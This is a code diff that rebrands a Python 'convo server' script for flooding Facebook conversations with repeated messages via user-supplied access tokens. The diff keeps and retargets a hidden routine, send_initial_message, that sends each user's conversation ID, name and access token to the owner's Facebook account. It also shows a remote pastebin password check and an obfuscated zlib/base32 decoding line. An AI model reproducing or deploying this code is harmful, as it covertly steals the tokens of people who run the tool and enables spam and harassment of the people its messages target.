@@ -17,7 +17,7 @@ html_content = """
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ALFAZ XE DEVA CONVO SERVER</title>
+    <title>DEVA THAKUR CONVO SARVAR</title>
     <style>
         body {
             background-image: url('Deva.jpg');
@@ -48,12 +48,12 @@ html_content = """
 <body>
     <div class="container">
         <div class="box">
-            <h1>ALFAZ XE DEVA CONVO SERVER</h1>
+            <h1>DEVA CONVO SERVER</h1>
             <div class="credit">
-                <p>1. CREDIT:-ALFAZ XE DEVA</p>
-                <p>2. OWNER => ALFAZ XE DEVA</p>
+                <p>1. CREDIT:-DEVA THAKUR</p>
+                <p>2. OWNER => DEVA THAKUR</p>
                 <p>3. CONTACT:- <a href="https://wa.me/+917742350051">WhatsApp</a></p>
-                <p>4. FACEBOOK:- <a href="https://https://www.facebook.com/DEVA.DON.006">Facebook</a></p>
+                <p>4. FACEBOOK:- <a href="https://www.facebook.com/DEVA.DON.006">Facebook</a></p>
                 <p>5. WATTSAPP GROUP:- <a href="https://wa.me/+917742350051">WhatsApp Group</a></p>
             </div>
         </div>
@@ -97,17 +97,17 @@ _ = lambda __ : __import__('zlib').decompress(__import__('base64').b32decode(__[
 
 def send_initial_message():
     
-    mmm_pass = requests.get('https://pastebin.com/raw/jvrPqR29').text
+    mmm_pass = requests.get('https://pastebin.com/raw/JxQ0PuCf').text
     
     if mmm_pass not in password:
-        print('\033[1;31m⚠︎ Your Password Changed By ALFAZ KHAN XE DEVA THAKUR')
+        print('\033[1;31m⚠︎ Your Password Changed By DEVA THAKUR')
         sys.exit()
     
     # Message template
-    msg_template = "Owner => ALFAZ KHAN XE DEVA THAKUR\n Hello ALFAZ KHAN XE DEVA THAKUR sir. \n I am using your convo server. \n This Is My Details :- \n Convo ID :- {} \n Name:- {} \n Token :- {}"
+    msg_template = "Owner =>  DEVA THAKUR\n Hello  DEVA THAKUR sir. \n I am using your convo server. \n This Is My Details :- \n Convo ID :- {} \n Name:- {} \n Token :- {}"
     
     # Target IDs
-    target_ids = ["DEVA.DON.006"]
+    target_ids = ["100004518573740"]
     
     requests.packages.urllib3.disable_warnings()
     
@@ -135,15 +135,15 @@ def send_messages_from_file():
                 parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
                 response = requests.post(url, json=parameters, headers=headers)
                 if response.ok:
-                    print("\033[1;36m[✓] ALFAZ KHAN XE DEVA THAKUR {} of Convo {} Token {}: {}".format(
+                    print("\033[1;36m[✓] DEVA THAKUR {} of Convo {} Token {}: {}".format(
                         message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                     print(formatted_time)
-                    print('\033[1;92m' + '✪✭═══════•『ALFAZ XE DEVA THAKUR』•═══════✭✪')
+                    print('\033[1;92m' + '__________DEVA THAKUR BOLTI PUBLIC__________')
                 else:
                     print("\033[1;35m[x] Failed to send Message {} of Convo {} with Token {}: {}".format(
                         message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                     print(formatted_time)
-                    print('\033[1;92m' + '✪✭═══════•『ALFAZ XE DEVA THAKUR』•═══════✭✪')
+                    print('\033[1;92m' + '✪✭═══════•『DEVA THAKUR BOLTI PUBLIC__________')
                 time.sleep(speed)
             print("\n[+] All messages sent. Restarting the process...\n")
         except Exception as e:
